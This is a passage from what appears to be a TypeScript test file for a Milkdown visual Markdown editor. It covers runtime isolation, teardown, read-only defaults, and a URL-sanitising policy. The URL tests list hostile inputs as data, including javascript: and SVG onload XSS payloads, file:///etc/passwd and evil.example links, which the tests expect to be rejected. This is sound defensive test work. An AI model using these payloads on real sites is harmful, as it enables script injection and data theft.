    expect((globalThis as Record<string, unknown>).__glyphquireRuntimeSentinel).toBe(0);
    expect(fetchSpy).not.toHaveBeenCalled();
    expect(workerSpy).not.toHaveBeenCalled();
    expect(openSpy).not.toHaveBeenCalled();
    expect(importSpy).not.toHaveBeenCalled();
    expect(activeElementSpy).not.toHaveBeenCalledWith(
      expect.stringMatching(/^(script|iframe|object|embed)$/i),
      expect.anything(),
    );
    expect(host.querySelector("canvas, script, iframe, object, embed")).toBeNull();
    expect(host.querySelectorAll("[data-glyphquire-runtime-placeholder]")).toHaveLength(2);
    expect(adapter.getMarkdown()).toContain(source);
  });

  it("tears down Milkdown and rejects further mounted-only operations", async () => {
    const { adapter, host } = await mountedAdapter(fixture("toggle", "valid-minimal"));
    adapter.destroy();

    expect(host.querySelector(".milkdown")).toBeNull();
    expect(() => adapter.focus()).toThrow("MilkdownVisualAdapter is not mounted");
    expect(() => adapter.destroy()).not.toThrow();
  });
});

describe("central visual URL policy", () => {
  const baseUrl = "https://app.glyphquire.test/workbench";

  it.each([
    "javascript:alert(1)",
    "JaVaScRiPt:alert(1)",
    "java\tscript:alert(1)",
    "javascript%3Aalert(1)",
    "javascript%253Aalert(1)",
    "data:text/html,<script>alert(1)</script>",
    "file:///etc/passwd",
    "blob:https://app.glyphquire.test/id",
    "//evil.example/path",
    "\\\\evil.example\\path",
    "https://user:password@evil.example/path",
    "https%3A%2F%2Fevil.example/path",
    "\u0000https://evil.example/path",
  ])("rejects hostile or ambiguous link URLs: %s", (url) => {
    expect(resolveVisualUrl(url, "link", baseUrl)).toBeNull();
  });

  it("applies safe external link relationship and target attributes", () => {
    expect(resolveVisualUrl("https://docs.example/guide", "link", baseUrl)).toEqual({
      href: "https://docs.example/guide",
      external: true,
      rel: "noopener noreferrer",
      target: "_blank",
    });
    expect(resolveVisualUrl("/notes/one", "link", baseUrl)).toEqual({
      href: "/notes/one",
      external: false,
    });
  });

  it("keeps every image URL inert so the asset resolver remains the sole image source seam", () => {
    expect(resolveVisualUrl("https://cdn.example/image.png", "image", baseUrl)).toBeNull();
    expect(resolveVisualUrl("/assets/image.png", "image", baseUrl)).toBeNull();
    expect(
      resolveVisualUrl("asset://33333333-3333-4333-8333-333333333333", "image", baseUrl),
    ).toBeNull();
    expect(resolveVisualUrl("mailto:person@example.com", "image", baseUrl)).toBeNull();
    expect(
      resolveVisualUrl("data:image/svg+xml,<svg onload=alert(1)>", "image", baseUrl),
    ).toBeNull();
  });
});

describe("VisualEditor", () => {
  it("defaults to a fail-safe read-only Milkdown projection", async () => {
    const wrapper = mount(VisualEditor, {
      props: { markdown: fixture("callout", "valid-minimal") },
      attachTo: document.body,
    });

    await vi.waitFor(() => {
      expect(wrapper.get(".ProseMirror").attributes("contenteditable")).toBe("false");
    });
    expect(wrapper.emitted("update:markdown")).toBeUndefined();
    const element = wrapper.element;
    wrapper.unmount();
    element.remove();
  });

  it("grants editing only when explicitly authorized and keeps projections silent", async () => {
    const wrapper = mount(VisualEditor, {
      props: { markdown: fixture("sticky", "valid-minimal"), readOnly: false },
      attachTo: document.body,
    });

    await vi.waitFor(() => {
      expect(wrapper.get(".ProseMirror").attributes("contenteditable")).toBe("true");
    });
    await wrapper.setProps({ markdown: fixture("toggle", "valid-minimal") });
    await nextListenerFlush();
    expect(wrapper.emitted("update:markdown")).toBeUndefined();
    const element = wrapper.element;
    wrapper.unmount();
    element.remove();
  });
});
